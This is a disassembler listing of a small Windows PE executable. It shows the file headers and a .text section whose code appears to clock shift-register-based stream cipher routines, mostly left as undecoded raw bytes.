                             //
                             // Headers
                             // ram:00400000-ram:004003ff
                             //
             assume DF = 0x0  (Default)
                             IMAGE_DOS_HEADER_00400000                       XREF[1]:     00400114(*)
        00400000 4d 5a 90        IMAGE_DO
                 00 03 00
                 00 00 04
           00400000 4d 5a           char[2]   "MZ"                    e_magic                           XREF[1]:     00400114(*)
              00400000 [0]            'M', 'Z'
           00400002 90 00           dw        90h                     e_cblp        Bytes of last page
           00400004 03 00           dw        3h                      e_cp          Pages in file
           00400006 00 00           dw        0h                      e_crlc        Relocations
           00400008 04 00           dw        4h                      e_cparhdr     Size of header in
           0040000a 00 00           dw        0h                      e_minalloc    Minimum extra para
           0040000c ff ff           dw        FFFFh                   e_maxalloc    Maximum extra para
           0040000e 00 00           dw        0h                      e_ss          Initial (relative)
           00400010 b8 00           dw        B8h                     e_sp          Initial SP value
           00400012 00 00           dw        0h                      e_csum        Checksum
           00400014 00 00           dw        0h                      e_ip          Initial IP value
           00400016 00 00           dw        0h                      e_cs          Initial (relative)
           00400018 40 00           dw        40h                     e_lfarlc      File address of re
           0040001a 00 00           dw        0h                      e_ovno        Overlay number
           0040001c 00 00 00 00 00  dw[4]                             e_res[4]      Reserved words
                    00 00 00
           00400024 00 00           dw        0h                      e_oemid       OEM identifier (fo
           00400026 00 00           dw        0h                      e_oeminfo     OEM information; e
           00400028 00 00 00 00 00  dw[10]                            e_res2[10]    Reserved words
                    00 00 00 00 00
                    00 00 00 00 00
           0040003c e0 00 00 00     ddw       E0h                     e_lfanew      File address of ne
           00400040 0e 1f ba 0e 00  db[64]                            e_program     Actual DOS program
                    b4 09 cd 21 b8
                    01 4c cd 21 54
        00400080 2b eb 12        IMAGE_RI
                 91 6f 8a
                 7c c2 6f
        004000d8 00              ??         00h
        004000d9 00              ??         00h
        004000da 00              ??         00h
        004000db 00              ??         00h
        004000dc 00              ??         00h
        004000dd 00              ??         00h
        004000de 00              ??         00h
        004000df 00              ??         00h
        004000e0 50 45 00        IMAGE_NT                                                    = 000022e0
                 00 4c 01                                                                    = 21D4h
                 04 00 09
        004001d8 2e 74 65        IMAGE_SE                                                    .text
                 78 74 00
                 00 00 a6
        00400200 2e 72 64        IMAGE_SE                                                    .rdata
                 61 74 61
                 00 00 7e
        00400228 2e 64 61        IMAGE_SE                                                    .data
                 74 61 00
                 00 00 28
        00400250 2e 72 73        IMAGE_SE                                                    .rsrc
                 72 63 00
                 00 00 7c
        00400278 00              ??         00h
        00400279 00              ??         00h
        0040027a 00              ??         00h
        0040027b 00              ??         00h
        0040027c 00              ??         00h
        0040027d 00              ??         00h
        0040027e 00              ??         00h
        0040027f 00              ??         00h
        00400280 00              ??         00h
        00400281 00              ??         00h
        00400282 00              ??         00h
        00400283 00              ??         00h
        00400284 00              ??         00h
        00400285 00              ??         00h
        00400286 00              ??         00h
        00400287 00              ??         00h
        00400288 00              ??         00h
        00400289 00              ??         00h
        0040028a 00              ??         00h
        0040028b 00              ??         00h
        0040028c 00              ??         00h
        0040028d 00              ??         00h
        0040028e 00              ??         00h
        0040028f 00              ??         00h
        00400290 00              ??         00h
        00400291 00              ??         00h
        00400292 00              ??         00h
        00400293 00              ??         00h
        00400294 00              ??         00h
        00400295 00              ??         00h
        00400296 00              ??         00h
        00400297 00              ??         00h
        00400298 00              ??         00h
        00400299 00              ??         00h
        0040029a 00              ??         00h
        0040029b 00              ??         00h
        0040029c 00              ??         00h
        0040029d 00              ??         00h
        0040029e 00              ??         00h
        0040029f 00              ??         00h
        004002a0 00              ??         00h
        004002a1 00              ??         00h
        004002a2 00              ??         00h
        004002a3 00              ??         00h
        004002a4 00              ??         00h
        004002a5 00              ??         00h
        004002a6 00              ??         00h
        004002a7 00              ??         00h
        004002a8 00              ??         00h
        004002a9 00              ??         00h
        004002aa 00              ??         00h
        004002ab 00              ??         00h
        004002ac 00              ??         00h
        004002ad 00              ??         00h
        004002ae 00              ??         00h
        004002af 00              ??         00h
        004002b0 00              ??         00h
        004002b1 00              ??         00h
        004002b2 00              ??         00h
        004002b3 00              ??         00h
        004002b4 00              ??         00h
        004002b5 00              ??         00h
        004002b6 00              ??         00h
        004002b7 00              ??         00h
        004002b8 00              ??         00h
        004002b9 00              ??         00h
        004002ba 00              ??         00h
        004002bb 00              ??         00h
        004002bc 00              ??         00h
        004002bd 00              ??         00h
        004002be 00              ??         00h
        004002bf 00              ??         00h
        004002c0 00              ??         00h
        004002c1 00              ??         00h
        004002c2 00              ??         00h
        004002c3 00              ??         00h
        004002c4 00              ??         00h
        004002c5 00              ??         00h
        004002c6 00              ??         00h
        004002c7 00              ??         00h
        004002c8 00              ??         00h
        004002c9 00              ??         00h
        004002ca 00              ??         00h
        004002cb 00              ??         00h
        004002cc 00              ??         00h
        004002cd 00              ??         00h
        004002ce 00              ??         00h
        004002cf 00              ??         00h
        004002d0 00              ??         00h
        004002d1 00              ??         00h
        004002d2 00              ??         00h
        004002d3 00              ??         00h
        004002d4 00              ??         00h
        004002d5 00              ??         00h
        004002d6 00              ??         00h
        004002d7 00              ??         00h
        004002d8 00              ??         00h
        004002d9 00              ??         00h
        004002da 00              ??         00h
        004002db 00              ??         00h
        004002dc 00              ??         00h
        004002dd 00              ??         00h
        004002de 00              ??         00h
        004002df 00              ??         00h
        004002e0 00              ??         00h
        004002e1 00              ??         00h
        004002e2 00              ??         00h
        004002e3 00              ??         00h
        004002e4 00              ??         00h
        004002e5 00              ??         00h
        004002e6 00              ??         00h
        004002e7 00              ??         00h
        004002e8 00              ??         00h
        004002e9 00              ??         00h
        004002ea 00              ??         00h
        004002eb 00              ??         00h
        004002ec 00              ??         00h
        004002ed 00              ??         00h
        004002ee 00              ??         00h
        004002ef 00              ??         00h
        004002f0 00              ??         00h
        004002f1 00              ??         00h
        004002f2 00              ??         00h
        004002f3 00              ??         00h
        004002f4 00              ??         00h
        004002f5 00              ??         00h
        004002f6 00              ??         00h
        004002f7 00              ??         00h
        004002f8 00              ??         00h
        004002f9 00              ??         00h
        004002fa 00              ??         00h
        004002fb 00              ??         00h
        004002fc 00              ??         00h
        004002fd 00              ??         00h
        004002fe 00              ??         00h
        004002ff 00              ??         00h
        00400300 00              ??         00h
        00400301 00              ??         00h
        00400302 00              ??         00h
        00400303 00              ??         00h
        00400304 00              ??         00h
        00400305 00              ??         00h
        00400306 00              ??         00h
        00400307 00              ??         00h
        00400308 00              ??         00h
        00400309 00              ??         00h
        0040030a 00              ??         00h
        0040030b 00              ??         00h
        0040030c 00              ??         00h
        0040030d 00              ??         00h
        0040030e 00              ??         00h
        0040030f 00              ??         00h
        00400310 00              ??         00h
        00400311 00              ??         00h
        00400312 00              ??         00h
        00400313 00              ??         00h
        00400314 00              ??         00h
        00400315 00              ??         00h
        00400316 00              ??         00h
        00400317 00              ??         00h
        00400318 00              ??         00h
        00400319 00              ??         00h
        0040031a 00              ??         00h
        0040031b 00              ??         00h
        0040031c 00              ??         00h
        0040031d 00              ??         00h
        0040031e 00              ??         00h
        0040031f 00              ??         00h
        00400320 00              ??         00h
        00400321 00              ??         00h
        00400322 00              ??         00h
        00400323 00              ??         00h
        00400324 00              ??         00h
        00400325 00              ??         00h
        00400326 00              ??         00h
        00400327 00              ??         00h
        00400328 00              ??         00h
        00400329 00              ??         00h
        0040032a 00              ??         00h
        0040032b 00              ??         00h
        0040032c 00              ??         00h
        0040032d 00              ??         00h
        0040032e 00              ??         00h
        0040032f 00              ??         00h
        00400330 00              ??         00h
        00400331 00              ??         00h
        00400332 00              ??         00h
        00400333 00              ??         00h
        00400334 00              ??         00h
        00400335 00              ??         00h
        00400336 00              ??         00h
        00400337 00              ??         00h
        00400338 00              ??         00h
        00400339 00              ??         00h
        0040033a 00              ??         00h
        0040033b 00              ??         00h
        0040033c 00              ??         00h
        0040033d 00              ??         00h
        0040033e 00              ??         00h
        0040033f 00              ??         00h
        00400340 00              ??         00h
        00400341 00              ??         00h
        00400342 00              ??         00h
        00400343 00              ??         00h
        00400344 00              ??         00h
        00400345 00              ??         00h
        00400346 00              ??         00h
        00400347 00              ??         00h
        00400348 00              ??         00h
        00400349 00              ??         00h
        0040034a 00              ??         00h
        0040034b 00              ??         00h
        0040034c 00              ??         00h
        0040034d 00              ??         00h
        0040034e 00              ??         00h
        0040034f 00              ??         00h
        00400350 00              ??         00h
        00400351 00              ??         00h
        00400352 00              ??         00h
        00400353 00              ??         00h
        00400354 00              ??         00h
        00400355 00              ??         00h
        00400356 00              ??         00h
        00400357 00              ??         00h
        00400358 00              ??         00h
        00400359 00              ??         00h
        0040035a 00              ??         00h
        0040035b 00              ??         00h
        0040035c 00              ??         00h
        0040035d 00              ??         00h
        0040035e 00              ??         00h
        0040035f 00              ??         00h
        00400360 00              ??         00h
        00400361 00              ??         00h
        00400362 00              ??         00h
        00400363 00              ??         00h
        00400364 00              ??         00h
        00400365 00              ??         00h
        00400366 00              ??         00h
        00400367 00              ??         00h
        00400368 00              ??         00h
        00400369 00              ??         00h
        0040036a 00              ??         00h
        0040036b 00              ??         00h
        0040036c 00              ??         00h
        0040036d 00              ??         00h
        0040036e 00              ??         00h
        0040036f 00              ??         00h
        00400370 00              ??         00h
        00400371 00              ??         00h
        00400372 00              ??         00h
        00400373 00              ??         00h
        00400374 00              ??         00h
        00400375 00              ??         00h
        00400376 00              ??         00h
        00400377 00              ??         00h
        00400378 00              ??         00h
        00400379 00              ??         00h
        0040037a 00              ??         00h
        0040037b 00              ??         00h
        0040037c 00              ??         00h
        0040037d 00              ??         00h
        0040037e 00              ??         00h
        0040037f 00              ??         00h
        00400380 00              ??         00h
        00400381 00              ??         00h
        00400382 00              ??         00h
        00400383 00              ??         00h
        00400384 00              ??         00h
        00400385 00              ??         00h
        00400386 00              ??         00h
        00400387 00              ??         00h
        00400388 00              ??         00h
        00400389 00              ??         00h
        0040038a 00              ??         00h
        0040038b 00              ??         00h
        0040038c 00              ??         00h
        0040038d 00              ??         00h
        0040038e 00              ??         00h
        0040038f 00              ??         00h
        00400390 00              ??         00h
        00400391 00              ??         00h
        00400392 00              ??         00h
        00400393 00              ??         00h
        00400394 00              ??         00h
        00400395 00              ??         00h
        00400396 00              ??         00h
        00400397 00              ??         00h
        00400398 00              ??         00h
        00400399 00              ??         00h
        0040039a 00              ??         00h
        0040039b 00              ??         00h
        0040039c 00              ??         00h
        0040039d 00              ??         00h
        0040039e 00              ??         00h
        0040039f 00              ??         00h
        004003a0 00              ??         00h
        004003a1 00              ??         00h
        004003a2 00              ??         00h
        004003a3 00              ??         00h
        004003a4 00              ??         00h
        004003a5 00              ??         00h
        004003a6 00              ??         00h
        004003a7 00              ??         00h
        004003a8 00              ??         00h
        004003a9 00              ??         00h
        004003aa 00              ??         00h
        004003ab 00              ??         00h
        004003ac 00              ??         00h
        004003ad 00              ??         00h
        004003ae 00              ??         00h
        004003af 00              ??         00h
        004003b0 00              ??         00h
        004003b1 00              ??         00h
        004003b2 00              ??         00h
        004003b3 00              ??         00h
        004003b4 00              ??         00h
        004003b5 00              ??         00h
        004003b6 00              ??         00h
        004003b7 00              ??         00h
        004003b8 00              ??         00h
        004003b9 00              ??         00h
        004003ba 00              ??         00h
        004003bb 00              ??         00h
        004003bc 00              ??         00h
        004003bd 00              ??         00h
        004003be 00              ??         00h
        004003bf 00              ??         00h
        004003c0 00              ??         00h
        004003c1 00              ??         00h
        004003c2 00              ??         00h
        004003c3 00              ??         00h
        004003c4 00              ??         00h
        004003c5 00              ??         00h
        004003c6 00              ??         00h
        004003c7 00              ??         00h
        004003c8 00              ??         00h
        004003c9 00              ??         00h
        004003ca 00              ??         00h
        004003cb 00              ??         00h
        004003cc 00              ??         00h
        004003cd 00              ??         00h
        004003ce 00              ??         00h
        004003cf 00              ??         00h
        004003d0 00              ??         00h
        004003d1 00              ??         00h
        004003d2 00              ??         00h
        004003d3 00              ??         00h
        004003d4 00              ??         00h
        004003d5 00              ??         00h
        004003d6 00              ??         00h
        004003d7 00              ??         00h
        004003d8 00              ??         00h
        004003d9 00              ??         00h
        004003da 00              ??         00h
        004003db 00              ??         00h
        004003dc 00              ??         00h
        004003dd 00              ??         00h
        004003de 00              ??         00h
        004003df 00              ??         00h
        004003e0 00              ??         00h
        004003e1 00              ??         00h
        004003e2 00              ??         00h
        004003e3 00              ??         00h
        004003e4 00              ??         00h
        004003e5 00              ??         00h
        004003e6 00              ??         00h
        004003e7 00              ??         00h
        004003e8 00              ??         00h
        004003e9 00              ??         00h
        004003ea 00              ??         00h
        004003eb 00              ??         00h
        004003ec 00              ??         00h
        004003ed 00              ??         00h
        004003ee 00              ??         00h
        004003ef 00              ??         00h
        004003f0 00              ??         00h
        004003f1 00              ??         00h
        004003f2 00              ??         00h
        004003f3 00              ??         00h
        004003f4 00              ??         00h
        004003f5 00              ??         00h
        004003f6 00              ??         00h
        004003f7 00              ??         00h
        004003f8 00              ??         00h
        004003f9 00              ??         00h
        004003fa 00              ??         00h
        004003fb 00              ??         00h
        004003fc 00              ??         00h
        004003fd 00              ??         00h
        004003fe 00              ??         00h
        004003ff 00              ??         00h
                             //
                             // .text
                             // ram:00401000-ram:00401fff
                             //
             assume FS_OFFSET = 0xffdff000
                             LAB_00401000                                    XREF[2]:     0040010c(*), 004001e4(*)
        00401000 8b 44 24 08     MOV        EAX,dword ptr [ESP + 0x8]
        00401004 8b 54 24 04     MOV        EDX,dword ptr [ESP + 0x4]
        00401008 8b c8           MOV        ECX,EAX
        0040100a c1 e9 09        SHR        ECX,0x9
        0040100d 83 e1 01        AND        ECX,0x1
        00401010 33 ca           XOR        ECX,EDX
        00401012 74 21           JZ         LAB_00401035
        00401014 8b c8           MOV        ECX,EAX
        00401016 d1 e9           SHR        ECX,0x1
        00401018 33 c8           XOR        ECX,EAX
        0040101a d1 e9           SHR        ECX,0x1
        0040101c 33 c8           XOR        ECX,EAX
        0040101e c1 e9 03        SHR        ECX,0x3
        00401021 33 c8           XOR        ECX,EAX
        00401023 25 ff ff        AND        EAX,0x3ffff
                 03 00
        00401028 c1 e9 0d        SHR        ECX,0xd
        0040102b d1 e0           SHL        EAX,0x1
        0040102d f6 c1 01        TEST       CL,0x1
        00401030 74 03           JZ         LAB_00401035
        00401032 83 f0 01        XOR        EAX,0x1
                             LAB_00401035                                    XREF[2]:     00401012(j), 00401030(j)
        00401035 c3              RET
        00401036 90              ??         90h
        00401037 90              ??         90h
        00401038 90              ??         90h
        00401039 90              ??         90h
        0040103a 90              ??         90h
        0040103b 90              ??         90h
        0040103c 90              ??         90h
        0040103d 90              ??         90h
        0040103e 90              ??         90h
        0040103f 90              ??         90h
        00401040 8b              ??         8Bh
        00401041 44              ??         44h    D
        00401042 24              ??         24h    $
        00401043 08              ??         08h
        00401044 8b              ??         8Bh
        00401045 54              ??         54h    T
        00401046 24              ??         24h    $
        00401047 04              ??         04h
        00401048 8b              ??         8Bh
        00401049 c8              ??         C8h
        0040104a c1              ??         C1h
        0040104b e9              ??         E9h
        0040104c 0b              ??         0Bh
        0040104d 83              ??         83h
        0040104e e1              ??         E1h
        0040104f 01              ??         01h
        00401050 33              ??         33h    3
        00401051 ca              ??         CAh
        00401052 74              ??         74h    t
        00401053 22              ??         22h    "
        00401054 8b              ??         8Bh
        00401055 c8              ??         C8h
        00401056 d1              ??         D1h
        00401057 e9              ??         E9h
        00401058 33              ??         33h    3
        00401059 c8              ??         C8h
        0040105a c1              ??         C1h
        0040105b e9              ??         E9h
        0040105c 04              ??         04h
        0040105d 33              ??         33h    3
        0040105e c8              ??         C8h
        0040105f c1              ??         C1h
        00401060 e9              ??         E9h
        00401061 04              ??         04h
        00401062 33              ??         33h    3
        00401063 c8              ??         C8h
        00401064 25              ??         25h    %
        00401065 ff              ??         FFh
        00401066 ff              ??         FFh
        00401067 1f              ??         1Fh
        00401068 00              ??         00h
        00401069 c1              ??         C1h
        0040106a e9              ??         E9h
        0040106b 0c              ??         0Ch
        0040106c d1              ??         D1h
        0040106d e0              ??         E0h
        0040106e f6              ??         F6h
        0040106f c1              ??         C1h
        00401070 01              ??         01h
        00401071 74              ??         74h    t
        00401072 03              ??         03h
        00401073 83              ??         83h
        00401074 f0              ??         F0h
        00401075 01              ??         01h
        00401076 c3              ??         C3h
        00401077 90              ??         90h
        00401078 90              ??         90h
        00401079 90              ??         90h
        0040107a 90              ??         90h
        0040107b 90              ??         90h
        0040107c 90              ??         90h
        0040107d 90              ??         90h
        0040107e 90              ??         90h
        0040107f 90              ??         90h
        00401080 8b              ??         8Bh
        00401081 44              ??         44h    D
        00401082 24              ??         24h    $
        00401083 08              ??         08h
        00401084 8b              ??         8Bh
        00401085 54              ??         54h    T
        00401086 24              ??         24h    $
        00401087 04              ??         04h
        00401088 8b              ??         8Bh
        00401089 c8              ??         C8h
        0040108a c1              ??         C1h
        0040108b e9              ??         E9h
        0040108c 0b              ??         0Bh
        0040108d 83              ??         83h
        0040108e e1              ??         E1h
        0040108f 01              ??         01h
        00401090 33              ??         33h    3
        00401091 ca              ??         CAh
        00401092 74              ??         74h    t
        00401093 21              ??         21h    !
        00401094 8b              ??         8Bh
        00401095 c8              ??         C8h
        00401096 d1              ??         D1h
        00401097 e9              ??         E9h
        00401098 33              ??         33h    3
        00401099 c8              ??         C8h
        0040109a c1              ??         C1h
        0040109b e9              ??         E9h
        0040109c 03              ??         03h
        0040109d 33              ??         33h    3
        0040109e c8              ??         C8h
        0040109f d1              ??         D1h
        004010a0 e9              ??         E9h
        004010a1 33              ??         33h    3
        004010a2 c8              ??         C8h
        004010a3 25              ??         25h    %
        004010a4 ff              ??         FFh
        004010a5 ff              ??         FFh
        004010a6 3f              ??         3Fh    ?
        004010a7 00              ??         00h
        004010a8 c1              ??         C1h
        004010a9 e9              ??         E9h
        004010aa 11              ??         11h
        004010ab d1              ??         D1h
        004010ac e0              ??         E0h
        004010ad f6              ??         F6h
        004010ae c1              ??         C1h
        004010af 01              ??         01h
        004010b0 74              ??         74h    t
        004010b1 03              ??         03h
        004010b2 83              ??         83h
        004010b3 f0              ??         F0h
        004010b4 01              ??         01h
        004010b5 c3              ??         C3h
        004010b6 90              ??         90h
        004010b7 90              ??         90h
        004010b8 90              ??         90h
        004010b9 90              ??         90h
        004010ba 90              ??         90h
        004010bb 90              ??         90h
        004010bc 90              ??         90h
        004010bd 90              ??         90h
        004010be 90              ??         90h
        004010bf 90              ??         90h
        004010c0 8b              ??         8Bh
        004010c1 44              ??         44h    D
        004010c2 24              ??         24h    $
        004010c3 08              ??         08h
        004010c4 53              ??         53h    S
        004010c5 56              ??         56h    V
        004010c6 0f              ??         0Fh
        004010c7 be              ??         BEh
        004010c8 10              ??         10h
        004010c9 0f              ??         0Fh
        004010ca be              ??         BEh
        004010cb 48              ??         48h    H
        004010cc 01              ??         01h
        004010cd c1              ??         C1h
        004010ce e2              ??         E2h
        004010cf 08              ??         08h
        004010d0 0b              ??         0Bh
        004010d1 d1              ??         D1h
        004010d2 8a              ??         8Ah
        004010d3 48              ??         48h    H
        004010d4 02              ??         02h
        004010d5 c0              ??         C0h
        004010d6 f9              ??         F9h
        004010d7 05              ??         05h
        004010d8 0f              ??         0Fh
        004010d9 be              ??         BEh
        004010da c9              ??         C9h
        004010db c1              ??         C1h
        004010dc e2              ??         E2h
        004010dd 03              ??         03h
        004010de 0b              ??         0Bh
        004010df d1              ??         D1h
        004010e0 8b              ??         8Bh
        004010e1 4c              ??         4Ch    L
        004010e2 24              ??         24h    $
        004010e3 0c              ??         0Ch
        004010e4 89              ??         89h
        004010e5 11              ??         11h
        004010e6 8a              ??         8Ah
        004010e7 58              ??         58h    X
        004010e8 05              ??         05h
        004010e9 0f              ??         0Fh
        004010ea be              ??         BEh
        004010eb 50              ??         50h    P
        004010ec 02              ??         02h
        004010ed 0f              ??         0Fh
        004010ee be              ??         BEh
        004010ef 70              ??         70h    p
        004010f0 03              ??         03h
        004010f1 c1              ??         C1h
        004010f2 e2              ??         E2h
        004010f3 06              ??         06h
        004010f4 0b              ??         0Bh
        004010f5 d6              ??         D6h
        004010f6 0f              ??         0Fh
        004010f7 be              ??         BEh
        004010f8 70              ??         70h    p
        004010f9 04              ??         04h
        004010fa c1              ??         C1h
        004010fb e2              ??         E2h
        004010fc 08              ??         08h
        004010fd c0              ??         C0h
        004010fe fb              ??         FBh
        004010ff 07              ??         07h
        00401100 0b              ??         0Bh
        00401101 d6              ??         D6h
        00401102 0f              ??         0Fh
        00401103 be              ??         BEh
        00401104 f3              ??         F3h
        00401105 d1              ??         D1h
        00401106 e2              ??         E2h
        00401107 0b              ??         0Bh
        00401108 d6              ??         D6h
        00401109 89              ??         89h
        0040110a 51              ??         51h    Q
        0040110b 04              ??         04h
        0040110c 0f              ??         0Fh
        0040110d be              ??         BEh
        0040110e 50              ??         50h    P
        0040110f 05              ??         05h
        00401110 0f              ??         0Fh
        00401111 be              ??         BEh
        00401112 70              ??         70h    p
        00401113 06              ??         06h
        00401114 0f              ??         0Fh
        00401115 be              ??         BEh
        00401116 40              ??         40h    @
        00401117 07              ??         07h
        00401118 c1              ??         C1h
        00401119 e2              ??         E2h
        0040111a 09              ??         09h
        0040111b 0b              ??         0Bh
        0040111c d6              ??         D6h
        0040111d 5e              ??         5Eh    ^
        0040111e c1              ??         C1h
        0040111f e2              ??         E2h
        00401120 08              ??         08h
        00401121 0b              ??         0Bh
        00401122 d0              ??         D0h
        00401123 5b              ??         5Bh    [
        00401124 89              ??         89h
        00401125 51              ??         51h    Q
        00401126 08              ??         08h
        00401127 c3              ??         C3h
        00401128 90              ??         90h
        00401129 90              ??         90h
        0040112a 90              ??         90h
        0040112b 90              ??         90h
        0040112c 90              ??         90h
        0040112d 90              ??         90h
        0040112e 90              ??         90h
        0040112f 90              ??         90h
        00401130 56              ??         56h    V
        00401131 8b              ??         8Bh
        00401132 74              ??         74h    t
        00401133 24              ??         24h    $
        00401134 08              ??         08h
        00401135 57              ??         57h    W
        00401136 8b              ??         8Bh
        00401137 46              ??         46h    F
        00401138 08              ??         08h
        00401139 8b              ??         8Bh
        0040113a 4e              ??         4Eh    N
        0040113b 04              ??         04h
        0040113c 8b              ??         8Bh
        0040113d 16              ??         16h
        0040113e 50              ??         50h    P
        0040113f 51              ??         51h    Q
        00401140 52              ??         52h    R
        00401141 e8              ??         E8h
        00401142 4a              ??         4Ah    J
        00401143 00              ??         00h
        00401144 00              ??         00h
        00401145 00              ??         00h
        00401146 8b              ??         8Bh
        00401147 f8              ??         F8h
        00401148 8b              ??         8Bh
        00401149 06              ??         06h
        0040114a 50              ??         50h    P
        0040114b 57              ??         57h    W
        0040114c e8              ??         E8h
        0040114d af              ??         AFh
        0040114e fe              ??         FEh
        0040114f ff              ??         FFh
        00401150 ff              ??         FFh
        00401151 8b              ??         8Bh
        00401152 4e              ??         4Eh    N
        00401153 04              ??         04h
        00401154 89              ??         89h
        00401155 06              ??         06h
        00401156 51              ??         51h    Q
        00401157 57              ??         57h    W
        00401158 e8              ??         E8h
        00401159 e3              ??         E3h
        0040115a fe              ??         FEh
        0040115b ff              ??         FFh
        0040115c ff              ??         FFh
        0040115d 8b              ??         8Bh
        0040115e 56              ??         56h    V
        0040115f 08              ??         08h
        00401160 89              ??         89h
        00401161 46              ??         46h    F
        00401162 04              ??         04h
        00401163 52              ??         52h    R
        00401164 57              ??         57h    W
        00401165 e8              ??         E8h
        00401166 16              ??         16h
        00401167 ff              ??         FFh
        00401168 ff              ??         FFh
        00401169 ff              ??         FFh
        0040116a 8b              ??         8Bh
        0040116b 3e              ??         3Eh    >
        0040116c 8b              ??         8Bh
        0040116d c8              ??         C8h
        0040116e 8b              ??         8Bh
        0040116f 46              ??         46h    F
        00401170 04              ??         04h
        00401171 83              ??         83h
        00401172 c4              ??         C4h
        00401173 24              ??         24h    $
        00401174 33              ??         33h    3
        00401175 c7              ??         C7h
        00401176 89              ??         89h
        00401177 4e              ??         4Eh    N
        00401178 08              ??         08h
        00401179 33              ??         33h    3
        0040117a c1              ??         C1h
        0040117b 5f              ??         5Fh    _
        0040117c 83              ??         83h
        0040117d e0              ??         E0h
        0040117e 01              ??         01h
        0040117f 5e              ??         5Eh    ^
        00401180 c3              ??         C3h
        00401181 90              ??         90h
        00401182 90              ??         90h
        00401183 90              ??         90h
        00401184 90              ??         90h
        00401185 90              ??         90h
        00401186 90              ??         90h
        00401187 90              ??         90h
        00401188 90              ??         90h
        00401189 90              ??         90h
        0040118a 90              ??         90h
        0040118b 90              ??         90h
        0040118c 90              ??         90h
        0040118d 90              ??         90h
        0040118e 90              ??         90h
        0040118f 90              ??         90h
        00401190 8b              ??         8Bh
        00401191 44              ??         44h    D
        00401192 24              ??         24h    $
        00401193 04              ??         04h
        00401194 8b              ??         8Bh
        00401195 54              ??         54h    T
        00401196 24              ??         24h    $
        00401197 08              ??         08h
        00401198 24              ??         24h    $
        00401199 80              ??         80h
        0040119a 33              ??         33h    3
        0040119b c9              ??         C9h
        0040119c 3c              ??         3Ch    <
        0040119d 80              ??         80h
        0040119e 0f              ??         0Fh
        0040119f 94              ??         94h
        004011a0 c1              ??         C1h
        004011a1 81              ??         81h
        004011a2 e2              ??         E2h
        004011a3 00              ??         00h
        004011a4 08              ??         08h
        004011a5 00              ??         00h
        004011a6 00              ??         00h
        004011a7 33              ??         33h    3
        004011a8 c0              ??         C0h
        004011a9 81              ??         81h
        004011aa fa              ??         FAh
        004011ab 00              ??         00h
        004011ac 08              ??         08h
        004011ad 00              ??         00h
        004011ae 00              ??         00h
        004011af 8b              ??         8Bh
        004011b0 54              ??         54h    T
        004011b1 24              ??         24h    $
        004011b2 0c              ??         0Ch
        004011b3 0f              ??         0Fh
        004011b4 94              ??         94h
        004011b5 c0              ??         C0h
        004011b6 03              ??         03h
        004011b7 c8              ??         C8h
        004011b8 81              ??         81h
        004011b9 e2              ??         E2h
        004011ba 00              ??         00h
        004011bb 08              ??         08h
        004011bc 00              ??         00h
        004011bd 00              ??         00h
        004011be 33              ??         33h    3
        004011bf c0              ??         C0h
        004011c0 81              ??         81h
        004011c1 fa              ??         FAh
        004011c2 00              ??         00h
        004011c3 08              ??         08h
        004011c4 00              ??         00h
        004011c5 00              ??         00h
        004011c6 0f              ??         0Fh
        004011c7 94              ??         94h
        004011c8 c0              ??         C0h
        004011c9 03              ??         03h
        004011ca c8              ??         C8h
        004011cb 33              ??         33h    3
        004011cc c0              ??         C0h
        004011cd 83              ??         83h
        004011ce f9              ??         F9h
        004011cf 01              ??         01h
        004011d0 0f              ??         0Fh
        004011d1 9e              ??         9Eh
        004011d2 c0              ??         C0h
        004011d3 c3              ??         C3h
        004011d4 90              ??         90h
        004011d5 90              ??         90h
        004011d6 90              ??         90h
        004011d7 90              ??         90h
        004011d8 90              ??         90h
        004011d9 90              ??         90h
        004011da 90              ??         90h
        004011db 90              ??         90h
        004011dc 90              ??         90h
        004011dd 90              ??         90h
        004011de 90              ??         90h
        004011df 90              ??         90h
        004011e0 53              ??         53h    S
        004011e1 55              ??         55h    U
        004011e2 8b              ??         8Bh
        004011e3 6c              ??         6Ch    l
        004011e4 24              ??         24h    $
        004011e5 14              ??         14h
        004011e6 56              ??         56h    V
        004011e7 33              ??         33h    3
        004011e8 f6              ??         F6h
        004011e9 b3              ??         B3h
        004011ea 01              ??         01h
        004011eb 85              ??         85h
        004011ec ed              ??         EDh
        004011ed 7e              ??         7Eh    ~
        004011ee 24              ??         24h    $
        004011ef 57              ??         57h    W
        004011f0 8b              ??         8Bh
        004011f1 7c              ??         7Ch    |
        004011f2 24              ??         24h    $
        004011f3 18              ??         18h
        004011f4 8b              ??         8Bh
        004011f5 44              ??         44h    D
        004011f6 24              ??         24h    $
        004011f7 14              ??         14h
        004011f8 50              ??         50h    P
        004011f9 e8              ??         E8h
        004011fa 32              ??         32h    2
        004011fb ff              ??         FFh
        004011fc ff              ??         FFh
        004011fd ff              ??         FFh
        004011fe 8a              ??         8Ah
        004011ff 14              ??         14h
        00401200 3e              ??         3Eh    >
        00401201 83              ??         83h
        00401202 c4              ??         C4h
        00401203 04              ??         04h
        00401204 d0              ??         D0h
        00401205 e3              ??         E3h
        00401206 0a              ??         0Ah
        00401207 d8              ??         D8h
        00401208 32              ??         32h    2
        00401209 d3              ??         D3h
        0040120a 88              ??         88h
        0040120b 14              ??         14h
        0040120c 3e              ??         3Eh    >
        0040120d 46              ??         46h    F
        0040120e 3b              ??         3Bh    ;
        0040120f f5              ??         F5h
        00401210 7c              ??         7Ch    |
        00401211 e2              ??         E2h
        00401212 5f              ??         5Fh    _
        00401213 5e              ??         5Eh    ^
        00401214 5d              ??         5Dh    ]
        00401215 5b              ??         5Bh    [
        00401216 c3              ??         C3h
        00401217 90              ??         90h
        00401218 90              ??         90h
        00401219 90              ??         90h
        0040121a 90              ??         90h
        0040121b 90              ??         90h
        0040121c 90              ??         90h
        0040121d 90              ??         90h
        0040121e 90              ??         90h
        0040121f 90              ??         90h
        00401220 8b              ??         8Bh
        00401221 44              ??         44h    D
        00401222 24              ??         24h    $
        00401223 0c              ??         0Ch
        00401224 8b              ??         8Bh
        00401225 4c              ??         4Ch    L
        00401226 24              ??         24h    $
        00401227 08              ??         08h
        00401228 8b              ??         8Bh
        00401229 54              ??         54h    T
        0040122a 24              ??         24h    $
        0040122b 04              ??         04h
        0040122c 50              ??         50h    P
        0040122d 51              ??         51h    Q
        0040122e 52              ??         52h    R
        0040122f e8              ??         E8h
        00401230 ac              ??         ACh
        00401231 ff              ??         FFh
        00401232 ff              ??         FFh
        00401233 ff              ??         FFh
        00401234 83              ??         83h
        00401235 c4              ??         C4h
        00401236 0c              ??         0Ch
        00401237 c3              ??         C3h
        00401238 90              ??         90h
        00401239 90              ??         90h
        0040123a 90              ??         90h
        0040123b 90              ??         90h
        0040123c 90              ??         90h
